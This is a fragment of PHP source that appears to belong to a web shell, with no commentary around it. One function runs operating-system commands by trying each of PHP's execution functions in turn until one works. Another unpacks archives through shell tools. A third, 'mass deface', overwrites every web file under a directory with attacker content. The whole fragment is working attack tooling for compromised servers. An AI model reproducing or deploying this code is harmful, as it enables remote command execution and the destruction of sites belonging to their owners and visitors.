// FUNCTION MULTI EXEC
function multi_exec($cmd) {
    $out = '';
    $methods = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
    foreach ($methods as $m) {
        if (function_exists($m)) {
            if ($m == 'system' || $m == 'passthru') {
                ob_start();
                $m($cmd);
                $out .= ob_get_clean();
            } elseif ($m == 'exec') {
                $m($cmd . ' 2>&1', $tmp);
                $out .= implode("\n", $tmp);
            } elseif ($m == 'shell_exec') {
                $out .= $m($cmd . ' 2>&1');
            } elseif ($m == 'popen') {
                $h = $m($cmd . ' 2>&1', 'r');
                while (!feof($h)) $out .= fread($h, 8192);
                pclose($h);
            }
            if (trim($out)) return "[Method: $m]\n$out";
        }
    }
    return "[-] No execution method available";
}

// EXTRACT ARCHIVE
function extract_archive($file, $target_dir) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $file = escapeshellarg($file);
    $target = escapeshellarg($target_dir);
   
    if ($ext == 'zip' && class_exists('ZipArchive')) {
        $zip = new ZipArchive;
        if ($zip->open($file) === TRUE) {
            $zip->extractTo($target_dir);
            $zip->close();
            return true;
        }
    } elseif (in_array($ext, ['tar', 'gz', 'tgz'])) {
        return shell_exec("tar -xzf $file -C $target 2>&1");
    } elseif ($ext == 'rar') {
        return shell_exec("unrar x -o+ $file $target 2>&1");
    } elseif ($ext == '7z') {
        return shell_exec("7z x $file -o$target -y 2>&1");
    } elseif ($ext == 'bz2') {
        return shell_exec("bunzip2 -c $file | tar -x -C $target 2>&1");
    }
    return false;
}

// MASS DEFACE
function mass_deface($start_dir, $content, $exts = ['php','html','htm','asp','aspx','jsp','js']) {
    $count = 0;
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($start_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $file) {
        if ($file->isFile() && in_array(strtolower($file->getExtension()), $exts)) {
            @file_put_contents($file->getPathname(), $content);
            $count++;
        }
    }
    return $count;
}
